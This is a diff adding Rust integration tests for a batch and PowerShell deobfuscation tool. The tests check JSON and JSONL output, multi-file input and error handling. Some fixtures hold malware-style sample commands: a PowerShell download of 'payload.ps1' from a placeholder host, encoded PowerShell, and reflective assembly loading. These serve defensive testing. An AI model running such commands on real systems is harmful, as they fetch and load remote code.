@@ -778,3 +778,360 @@ fn analyze_env_option_requires_assignment() {
         .failure()
         .stderr(predicates::str::contains("expected NAME=VALUE"));
 }
+
+#[test]
+fn bare_file_argument_defaults_to_analyze_json() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.ps1");
+    fs::write(
+        &input,
+        "Invoke-WebRequest -Uri https://bare-file.example/payload.ps1",
+    )
+    .expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .arg(input.to_str().expect("path"))
+        .output()
+        .expect("run");
+
+    assert!(
+        out.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
+    assert_eq!(
+        v["extracted"]["powershell"].as_u64().unwrap_or_default(),
+        1,
+        "bare path should be analyzed as standalone PowerShell: {v}"
+    );
+}
+
+#[test]
+fn analyze_json_includes_extracted_counts() {
+    use base64::Engine;
+
+    let payload = "Write-Host analyze-json";
+    let utf16: Vec<u8> = payload
+        .encode_utf16()
+        .flat_map(|u| u.to_le_bytes())
+        .collect();
+    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
+
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["analyze", input.to_str().expect("path")])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
+    assert!(
+        v["extracted"]["powershell"].as_u64().unwrap_or_default() >= 1,
+        "PowerShell extracted count missing from analyze JSON: {v}"
+    );
+    assert_eq!(v["recovered"]["pe"].as_u64(), Some(0));
+}
+
+#[test]
+fn analyze_jsonl_meta_includes_extracted_counts() {
+    use base64::Engine;
+
+    let payload = "Write-Host meta";
+    let utf16: Vec<u8> = payload
+        .encode_utf16()
+        .flat_map(|u| u.to_le_bytes())
+        .collect();
+    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
+
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+
+    let first_line = String::from_utf8_lossy(&out.stdout)
+        .lines()
+        .next()
+        .expect("meta line")
+        .to_string();
+    let meta: serde_json::Value = serde_json::from_str(&first_line).expect("meta json");
+    assert_eq!(meta["kind"], "meta");
+    assert!(
+        meta["extracted"]["powershell"].as_u64().unwrap_or_default() >= 1,
+        "PowerShell extracted count missing from meta: {meta}"
+    );
+    assert_eq!(meta["extracted"]["cmd"].as_u64(), Some(0));
+    assert_eq!(meta["extracted"]["jscript"].as_u64(), Some(0));
+    assert_eq!(meta["extracted"]["vbs"].as_u64(), Some(0));
+    assert_eq!(meta["recovered"]["pe"].as_u64(), Some(0));
+}
+
+#[test]
+fn analyze_jsonl_accepts_multiple_input_files() {
+    let dir = TempDir::new().expect("tmp");
+    let first = dir.path().join("first.bat");
+    let second = dir.path().join("second.bat");
+    fs::write(&first, "curl http://one.example/a\r\n").expect("write first");
+    fs::write(&second, "curl http://two.example/b\r\n").expect("write second");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "analyze",
+            first.to_str().expect("first path"),
+            second.to_str().expect("second path"),
+            "--jsonl",
+        ])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+
+    let lines: Vec<serde_json::Value> = String::from_utf8_lossy(&out.stdout)
+        .lines()
+        .map(|line| serde_json::from_str(line).expect("valid jsonl"))
+        .collect();
+    let metas: Vec<_> = lines
+        .iter()
+        .filter(|line| line["kind"] == "meta")
+        .map(|line| line["input"].as_str().unwrap_or_default().to_string())
+        .collect();
+    assert_eq!(
+        metas,
+        vec![
+            first.to_string_lossy().to_string(),
+            second.to_string_lossy().to_string()
+        ]
+    );
+    assert!(
+        lines
+            .iter()
+            .any(|line| line.to_string().contains("one.example"))
+            && lines
+                .iter()
+                .any(|line| line.to_string().contains("two.example")),
+        "missing one of the expected URL traits: {lines:#?}"
+    );
+}
+
+#[test]
+fn analyze_multiple_input_files_requires_jsonl() {
+    let dir = TempDir::new().expect("tmp");
+    let first = dir.path().join("first.bat");
+    let second = dir.path().join("second.bat");
+    fs::write(&first, "echo one\r\n").expect("write first");
+    fs::write(&second, "echo two\r\n").expect("write second");
+
+    Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "analyze",
+            first.to_str().expect("first path"),
+            second.to_str().expect("second path"),
+        ])
+        .assert()
+        .failure()
+        .stderr(predicates::str::contains(
+            "multiple analyze inputs require --jsonl",
+        ));
+}
+
+#[test]
+fn analyze_jsonl_accepts_file_list() {
+    let dir = TempDir::new().expect("tmp");
+    let first = dir.path().join("first.bat");
+    let second = dir.path().join("second.bat");
+    let list = dir.path().join("inputs.txt");
+    fs::write(&first, "curl http://list-one.example/a\r\n").expect("write first");
+    fs::write(&second, "curl http://list-two.example/b\r\n").expect("write second");
+    fs::write(
+        &list,
+        format!("{}\n{}\n\n", first.display(), second.display()),
+    )
+    .expect("write list");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "analyze",
+            "--file-list",
+            list.to_str().expect("list path"),
+            "--jsonl",
+        ])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+
+    let lines: Vec<serde_json::Value> = String::from_utf8_lossy(&out.stdout)
+        .lines()
+        .map(|line| serde_json::from_str(line).expect("valid jsonl"))
+        .collect();
+    let metas: Vec<_> = lines
+        .iter()
+        .filter(|line| line["kind"] == "meta")
+        .map(|line| line["input"].as_str().unwrap_or_default().to_string())
+        .collect();
+    assert_eq!(
+        metas,
+        vec![
+            first.to_string_lossy().to_string(),
+            second.to_string_lossy().to_string()
+        ]
+    );
+    assert!(
+        lines
+            .iter()
+            .any(|line| line.to_string().contains("list-one.example"))
+            && lines
+                .iter()
+                .any(|line| line.to_string().contains("list-two.example")),
+        "missing one of the expected URL traits: {lines:#?}"
+    );
+}
+
+#[test]
+fn analyze_file_list_requires_jsonl() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    let list = dir.path().join("inputs.txt");
+    fs::write(&input, "echo hi\r\n").expect("write input");
+    fs::write(&list, format!("{}\n", input.display())).expect("write list");
+
+    Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["analyze", "--file-list", list.to_str().expect("list path")])
+        .assert()
+        .failure()
+        .stderr(predicates::str::contains(
+            "analyze --file-list requires --jsonl",
+        ));
+}
+
+#[test]
+fn analyze_file_list_is_size_capped() {
+    let dir = TempDir::new().expect("tmp");
+    let list = dir.path().join("inputs.txt");
+    fs::write(&list, "x".repeat(16 * 1024 * 1024 + 1)).expect("write list");
+
+    Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "analyze",
+            "--file-list",
+            list.to_str().expect("list path"),
+            "--jsonl",
+        ])
+        .assert()
+        .failure()
+        .stderr(predicates::str::contains("file list"))
+        .stderr(predicates::str::contains("exceeds"));
+}
+
+#[test]
+fn analyze_can_emit_drive_profile_to_stderr() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(&input, "set X=hi\r\necho %X%\r\n").expect("write");
+
+    Command::cargo_bin("batdeob")
+        .expect("bin")
+        .env("HARRINGTON_PROFILE_DRIVE", "1")
+        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
+        .assert()
+        .success()
+        .stderr(predicates::str::contains("harrington_profile_drive"))
+        .stderr(predicates::str::contains("fast_expand_ms="));
+}
+
+#[test]
+fn analyze_can_emit_final_profile_to_stderr() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        "echo powershell -Command [Reflection.Assembly]::Load($b)\r\n",
+    )
+    .expect("write");
+
+    Command::cargo_bin("batdeob")
+        .expect("bin")
+        .env("HARRINGTON_PROFILE_FINAL", "1")
+        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
+        .assert()
+        .success()
+        .stderr(predicates::str::contains("harrington_profile_final"));
+}
+
+#[cfg(unix)]
+#[test]
+fn analyze_jsonl_handles_closed_stdout_without_panic() {
+    use std::io::{BufRead, BufReader};
+    use std::process::{Command as StdCommand, Stdio};
+
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    let mut body = String::new();
+    for i in 0..200_000 {
+        body.push_str(&format!(
+            "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA{i:06}\r\n"
+        ));
+    }
+    fs::write(&input, body).expect("write");
+
+    let bin = assert_cmd::cargo::cargo_bin("batdeob");
+    let mut child = StdCommand::new(bin)
+        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .spawn()
+        .expect("spawn");
+
+    let stdout = child.stdout.take().expect("stdout");
+    let mut reader = BufReader::new(stdout);
+    let mut first_line = String::new();
+    reader.read_line(&mut first_line).expect("read first line");
+    assert!(
+        first_line.contains(r#""kind":"meta""#),
+        "line: {first_line}"
+    );
+    drop(reader);
+
+    let output = child.wait_with_output().expect("wait");
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(
+        output.status.success(),
+        "closed stdout should exit cleanly, status={:?}, stderr:\n{}",
+        output.status,
+        stderr
+    );
+    assert!(
+        !stderr.contains("panicked") && !stderr.contains("Broken pipe"),
+        "closed stdout produced panic-like stderr:\n{}",
+        stderr
+    );
+}
